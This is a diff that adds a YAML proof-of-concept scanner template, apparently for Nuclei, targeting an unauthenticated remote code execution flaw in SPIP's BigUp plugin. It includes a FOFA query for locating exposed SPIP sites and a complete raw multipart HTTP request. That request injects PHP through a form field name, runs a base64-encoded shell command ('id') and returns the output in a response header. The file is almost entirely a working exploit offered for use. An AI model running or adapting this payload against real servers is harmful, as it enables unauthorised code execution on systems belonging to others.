@@ -1,0 +1,60 @@
+id: poc-tr5ta2lxglvwzd1h
+info:
+  name: SPIP BigUp 未授权远程代码执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tr5ta2lxglvwzd1h'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tr5ta2lxglvwzd1h
+    fofa: body="SPIP Blog" || icon_hash=="-1224668706"
+http:
+- raw:
+  - 'POST / HTTP/2
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=jBc9tge4JtkyKqLk
+
+    Content-Length: 664
+
+
+    --jBc9tge4JtkyKqLk
+
+    Content-Disposition: form-data; name="formulaire_action"
+
+
+    login
+
+    --jBc9tge4JtkyKqLk
+
+    Content-Disposition: form-data; name="bigup_retrouver_fichiers"
+
+
+    1
+
+    --jBc9tge4JtkyKqLk
+
+    Content-Disposition: form-data; name="oAkq['' . header(\"X-Command-Output: \" . base64_encode(shell_exec(base64_decode(\"aWQ=\")))) . die() . '']"; filename="JwrK"
+
+    Content-Type: text/plain
+
+
+    Contenu du fichier!
+
+    --jBc9tge4JtkyKqLk
+
+    Content-Disposition: form-data; name="formulaire_action_args"
+
+
+    XvgjTQWys2NedplkOiCxRgNly7BDGAHWN9vv7/la9KiGKjxIBam8Z/K0ppqKixdte4PQdY9QphDihEJD7TO/k+HWDUG+ZTDgxeEsMR+wX3eYBpL7l/lXicIKqzxhH8erqx2+eO94rAK7GlOYjQ==
+
+    --jBc9tge4JtkyKqLk--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
